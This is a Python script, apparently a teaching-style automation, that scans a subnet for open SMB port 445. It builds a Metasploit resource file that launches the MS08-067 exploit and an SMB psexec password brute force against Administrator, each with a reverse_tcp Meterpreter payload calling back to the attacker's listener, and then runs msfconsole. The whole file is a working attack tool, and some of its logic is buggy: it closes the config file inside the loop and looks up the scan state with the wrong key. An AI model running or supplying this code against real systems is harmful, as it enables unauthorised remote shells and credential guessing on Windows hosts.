import os
import optparse
import sys
import nmap

def find_targets(subnet):
        nm_scan = nmap.PortScanner()
        nm_scan.scan(subnet, '445')
        tgt_hosts = []
        for host in nm_scan.all_hosts():
            if nm_scan[host].has_tcp(445):
                state = nm_scan['tcp'][445]['state']
                if state == 'open':
                    tgt_hosts.append(host)
                    print "[+] Found vulnerable host: " + host
        return tgt_hosts


def setup_handler(config_file, lhost, lport):
    config_file.write('use exploit/multi/handler\n')
    config_file.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')
    config_file.write('setg DisablePayloadHandler 1\n')


def conficker_exploit(config_file, tgt_host, lhost, lport):
    config_file.write('use exploit/windows/smb/ms08_067_netapi\n')
    config_file.write('set RHOST ' + str(tgt_host) + '\n')
    config_file.write('set payload ' + 'windows/meterpreter/reverse_tcp\n')
    config_file.write('set LPORT ' + str(lport) + '\n')
    config_file.write('set LHOST ' + lhost + '\n')
    config_file.write('exploit -j -z\n')


def smb_brute(config_file, tgt_host, passwd_file, lhost, lport):
    username = 'Administrator'
    pf = open(passwd_file, 'r')
    for password in pf.readlines():
        password = password.strip('\r').strip('\n')
        config_file.write('use exploit/windows/smb/psexec\n')
        config_file.write('set SMBUser ' + str(username) + '\n')
        config_file.write('set SMBPass ' + str(password) + '\n')
        config_file.write('set RHOST ' + str(tgt_host) + '\n')
        config_file.write('set payload windows/meterpreter/reverse_tcp\n')
        config_file.write('set LHOST ' + str(lhost) + '\n')
        config_file.write('set LPORT ' + str(lport) + '\n')
        config_file.write('exploit -j -z\n')


def main():
    config_file = open('meta.rc', 'w')
    parser = optparse.OptionParser('usage %prog -H <RHOST[s]> -l <LHOST>'
                                   '[-p <LPORT> -F <passwd file>]')
    parser.add_option('-H', dest='tgt_host', type='string',
                      help='specify target host')
    parser.add_option('-l', dest='lhost', type='string',
                      help='specify listen address')
    parser.add_option('-p', dest='lport', type='string',
                      help='specify listen port')
    parser.add_option('-F', dest='passwd_file', type='string',
                      help='specify password file')
    (options, args) = parser.parse_args()
    if (options.tgt_host == None) or (options.lhost == None):
        parser.usage
        exit(0)
    lhost = options.lhost
    lport = options.lport
    if lport == None:
        lport = '1337'
    passwd_file = options.passwd_file
    tgt_hosts = find_targets(options.tgt_host)
    setup_handler(config_file, lhost, lport)
    for tgt_host in tgt_hosts:
        conficker_exploit(config_file, tgt_host, lhost, lport)
        if passwd_file != None:
            smb_brute(config_file, tgt_host,passwd_file, lhost, lport)
        config_file.close()
        os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()